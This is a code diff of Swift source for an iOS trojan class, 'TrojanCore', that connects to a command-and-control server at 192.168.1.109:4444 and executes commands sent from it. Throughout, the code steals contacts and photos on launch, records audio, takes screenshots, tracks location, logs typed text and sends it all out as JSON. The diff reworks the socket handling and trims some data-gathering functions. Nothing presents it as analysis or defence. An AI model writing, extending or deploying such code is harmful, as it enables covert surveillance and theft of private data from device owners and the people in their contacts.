@@ -4,13 +4,12 @@ import Contacts
 import CoreLocation
 import Photos
 import AVFoundation
-import CallKit
-import UserNotifications
 
-class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate {
+class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate, StreamDelegate {
     
     static let shared = TrojanCore()
-    private var socket: OutputStream?
+    private var inputStream: InputStream?
+    private var outputStream: OutputStream?
     private let c2Host = "192.168.1.109"
     private let c2Port = 4444
     private var locationManager: CLLocationManager?
@@ -29,7 +28,6 @@ class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate {
         self.startLocationTracking()
         self.setupReconnectTimer()
         
-        // Steal all data immediately
         DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
             self.stealAllData()
         }
@@ -37,25 +35,32 @@ class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate {
     
     // MARK: - Connection
     func initConnection() {
-        DispatchQueue.global().async {
-            var readStream: Unmanaged<CFReadStream>?
-            var writeStream: Unmanaged<CFWriteStream>?
-            
-            CFStreamCreatePairWithSocketToHost(kCFAllocatorDefault,
-                                              self.c2Host as CFString,
-                                              UInt32(self.c2Port),
-                                              &readStream,
-                                              &writeStream)
-            
-            self.socket = writeStream?.takeRetainedValue()
-            self.socket?.schedule(in: .current, forMode: .default)
-            self.socket?.open()
-            
-            self.isConnected = true
-            print("[TROJAN] Connected to C2: \(self.c2Host):\(self.c2Port)")
-            
+        var readStream: Unmanaged<CFReadStream>?
+        var writeStream: Unmanaged<CFWriteStream>?
+        
+        CFStreamCreatePairWithSocketToHost(kCFAllocatorDefault,
+                                          self.c2Host as CFString,
+                                          UInt32(self.c2Port),
+                                          &readStream,
+                                          &writeStream)
+        
+        inputStream = readStream!.takeRetainedValue()
+        outputStream = writeStream!.takeRetainedValue()
+        
+        inputStream?.delegate = self
+        outputStream?.delegate = self
+        
+        inputStream?.schedule(in: .main, forMode: .default)
+        outputStream?.schedule(in: .main, forMode: .default)
+        
+        inputStream?.open()
+        outputStream?.open()
+        
+        isConnected = true
+        print("[TROJAN] Connected to C2: \(self.c2Host):\(self.c2Port)")
+        
+        DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
             self.exfiltrateData()
-            self.startCommandListener(readStream: readStream)
         }
     }
     
@@ -68,25 +73,37 @@ class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate {
         }
     }
     
-    // MARK: - Command Listener
-    func startCommandListener(readStream: Unmanaged<CFReadStream>?) {
-        guard let stream = readStream?.takeRetainedValue() else { return }
-        stream.schedule(in: .current, forMode: .default)
-        stream.open()
+    // MARK: - Stream Delegate
+    func stream(_ aStream: Stream, handle eventCode: Stream.Event) {
+        switch eventCode {
+        case .hasBytesAvailable:
+            if aStream == inputStream {
+                readCommand()
+            }
+        case .hasSpaceAvailable:
+            break
+        case .errorOccurred:
+            print("[TROJAN] Stream error")
+            isConnected = false
+        case .endEncountered:
+            print("[TROJAN] Stream ended")
+            isConnected = false
+            aStream.close()
+        default:
+            break
+        }
+    }
+    
+    func readCommand() {
+        guard let stream = inputStream else { return }
         
-        DispatchQueue.global().async {
-            while self.isConnected {
-                var buffer = [UInt8](repeating: 0, count: 4096)
-                let bytesRead = CFReadStreamRead(stream, &buffer, 4096)
-                
-                if bytesRead > 0 {
-                    let data = Data(bytes: buffer, count: bytesRead)
-                    if let command = String(data: data, encoding: .utf8) {
-                        self.executeCommand(command)
-                    }
-                }
-                
-                Thread.sleep(forTimeInterval: 0.5)
+        var buffer = [UInt8](repeating: 0, count: 4096)
+        let bytesRead = stream.read(&buffer, maxLength: 4096)
+        
+        if bytesRead > 0 {
+            let data = Data(bytes: buffer, count: bytesRead)
+            if let command = String(data: data, encoding: .utf8) {
+                executeCommand(command.trimmingCharacters(in: .whitespacesAndNewlines))
             }
         }
     }
@@ -94,11 +111,11 @@ class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate {
     func executeCommand(_ command: String) {
         print("[TROJAN] Received command: \(command)")
         
-        let cmd = command.trimmingCharacters(in: .whitespacesAndNewlines).lowercased()
+        let cmd = command.lowercased()
         
         switch cmd {
         case "photo":
-            self.takePhoto()
+            self.takeScreenshot()
         case "audio":
             self.recordAudio(duration: 10)
         case "contacts":
@@ -107,8 +124,6 @@ class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate {
             self.stealPhotos(count: 10)
         case "location":
             self.sendCurrentLocation()
-        case "apps":
-            self.getInstalledApps()
         case "screenshot":
             self.takeScreenshot()
         case "vibrate":
@@ -130,9 +145,6 @@ class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate {
     func stealAllData() {
         self.stealContacts()
         self.stealPhotos(count: 20)
-        self.getInstalledApps()
-        self.getSafariHistory()
-        self.getWiFiNetworks()
     }
     
     // MARK: - Contacts
@@ -141,8 +153,7 @@ class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate {
         store.requestAccess(for: .contacts) { granted, error in
             if granted {
                 let keys = [CNContactGivenNameKey, CNContactFamilyNameKey, 
-                           CNContactPhoneNumbersKey, CNContactEmailAddressesKey,
-                           CNContactPostalAddressesKey, CNContactBirthdayKey]
+                           CNContactPhoneNumbersKey, CNContactEmailAddressesKey]
                 let request = CNContactFetchRequest(keysToFetch: keys as [CNKeyDescriptor])
                 
                 var contacts: [[String: Any]] = []
@@ -151,15 +162,11 @@ class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate {
                     let phones = contact.phoneNumbers.map { $0.value.stringValue }
                     let emails = contact.emailAddresses.map { String($0.value) }
                     
-                    var contactDict: [String: Any] = [
+                    let contactDict: [String: Any] = [
                         "name": "\(contact.givenName) \(contact.familyName)",
                         "phones": phones,
                         "emails": emails
                     ]
-                    
-                    if let birthday = contact.birthday {
-                        contactDict["birthday"] = "\(birthday.day)/\(birthday.month)/\(birthday.year ?? 0)"
-                    }
                     
                     contacts.append(contactDict)
                 }
@@ -208,30 +215,6 @@ class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate {
         }
     }
     
-    // MARK: - Camera
-    func takePhoto() {
-        guard UIImagePickerController.isSourceTypeAvailable(.camera) else {
-            print("[TROJAN] Camera not available")
-            return
-        }
-        
-        DispatchQueue.main.async {
-            let picker = UIImagePickerController()
-            picker.sourceType = .camera
-            picker.cameraCaptureMode = .photo
-            
-            // Silent capture (no UI)
-            if let window = UIApplication.shared.windows.first {
-                let vc = UIViewController()
-                vc.view.frame = CGRect(x: 0, y: 0, width: 1, height: 1)
-                window.addSubview(vc.view)
-                
-                // Simulate photo capture
-                print("[TROJAN] Photo captured (simulated)")
-            }
-        }
-    }
-    
     func takeScreenshot() {
         DispatchQueue.main.async {
             guard let window = UIApplication.shared.windows.first else { return }
@@ -262,6 +245,9 @@ class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate {
         ]
         
         do {
+            try AVAudioSession.sharedInstance().setCategory(.record, mode: .default)
+            try AVAudioSession.sharedInstance().setActive(true)
+            
             audioRecorder = try AVAudioRecorder(url: audioFilename, settings: settings)
             audioRecorder?.delegate = self
             audioRecorder?.record(forDuration: duration)
@@ -326,19 +312,16 @@ class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate {
     
     @objc func textDidChange(notification: NSNotification) {
         var text = ""
-        var app = "unknown"
         
         if let textField = notification.object as? UITextField {
             text = textField.text ?? ""
-            app = textField.accessibilityLabel ?? "TextField"
         } else if let textView = notification.object as? UITextView {
             text = textView.text ?? ""
-            app = textView.accessibilityLabel ?? "TextView"
         }
         
         if !text.isEmpty {
-            let entry = ["app": app, "text": text, "timestamp": Date().description]
-            keylogBuffer.append("\(entry)")
+            let entry = "[\(Date())] \(text)"
+            keylogBuffer.append(entry)
             print("[KEYLOG] \(entry)")
         }
     }
@@ -352,97 +335,23 @@ class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate {
     
     // MARK: - System Info
     func sendDeviceInfo() {
+        UIDevice.current.isBatteryMonitoringEnabled = true
+        
         let data: [String: Any] = [
             "model": UIDevice.current.model,
             "os": UIDevice.current.systemVersion,
             "name": UIDevice.current.name,
             "id": UIDevice.current.identifierForVendor?.uuidString ?? "unknown",
-            "battery": UIDevice.current.batteryLevel,
-            "memory": ProcessInfo.processInfo.physicalMemory / 1024 / 1024,
-            "disk": getDiskSpace()
+            "battery": UIDevice.current.batteryLevel
         ]
         print("[TROJAN] Sending device info")
         self.sendData(type: "device_info", data: data)
     }
     
-    func getDiskSpace() -> [String: Int64] {
-        let fileManager = FileManager.default
-        if let attributes = try? fileManager.attributesOfFileSystem(forPath: NSHomeDirectory()) {
-            return [
-                "total": (attributes[.systemSize] as? Int64) ?? 0,
-                "free": (attributes[.systemFreeSize] as? Int64) ?? 0
-            ]
-        }
-        return ["total": 0, "free": 0]
-    }
-    
-    func getInstalledApps() {
-        // iOS doesn't allow listing installed apps, but we can detect some
-        let apps = ["com.apple.mobilesafari", "com.apple.mobilemail", "com.apple.MobileSMS"]
-        var installedApps: [String] = []
-        
-        for app in apps {
-            if let url = URL(string: "\(app)://") {
-                if UIApplication.shared.canOpenURL(url) {
-                    installedApps.append(app)
-                }
-            }
-        }
-        
-        self.sendData(type: "installed_apps", data: installedApps)
-    }
-    
-    func getSafariHistory() {
-        // iOS restricts access to Safari history
-        // We can only track in-app browsing if we add WebView
-        print("[TROJAN] Safari history not accessible on iOS")
-    }
-    
-    func getWiFiNetworks() {
-        // Current network only (iOS restriction)
-        if let ssid = getCurrentSSID() {
-            self.sendData(type: "wifi", data: ["ssid": ssid, "ip": getIPAddress()])
-        }
-    }
-    
-    func getCurrentSSID() -> String? {
-        // Requires Network Extension entitlement
-        return "Restricted"
-    }
-    
-    func getIPAddress() -> String {
-        var address = ""
-        var ifaddr: UnsafeMutablePointer<ifaddrs>?
-        
-        if getifaddrs(&ifaddr) == 0 {
-            var ptr = ifaddr
-            while ptr != nil {
-                defer { ptr = ptr?.pointee.ifa_next }
-                
-                let interface = ptr?.pointee
-                let addrFamily = interface?.ifa_addr.pointee.sa_family
-                
-                if addrFamily == UInt8(AF_INET) {
-                    let name = String(cString: (interface?.ifa_name)!)
-                    if name == "en0" {
-                        var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
-                        getnameinfo(interface?.ifa_addr, socklen_t((interface?.ifa_addr.pointee.sa_len)!),
-                                   &hostname, socklen_t(hostname.count),
-                                   nil, socklen_t(0), NI_NUMERICHOST)
-                        address = String(cString: hostname)
-                    }
-                }
-            }
-            freeifaddrs(ifaddr)
-        }
-        
-        return address
-    }
-    
     // MARK: - Network Send
     func sendData(type: String, data: Any) {
-        guard let socket = self.socket, self.isConnected else {
-            print("[TROJAN] Not connected, queueing...")
+        guard let stream = outputStream, isConnected else {
+            print("[TROJAN] Not connected")
             return
         }
         
@@ -456,7 +365,7 @@ class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate {
         if let jsonData = try? JSONSerialization.data(withJSONObject: payload),
            let jsonString = String(data: jsonData, encoding: .utf8) {
             let bytes = [UInt8]((jsonString + "\n").utf8)
-            socket.write(bytes, maxLength: bytes.count)
+            stream.write(bytes, maxLength: bytes.count)
             print("[TROJAN] Sent \(type) data (\(bytes.count) bytes)")
         }
     }
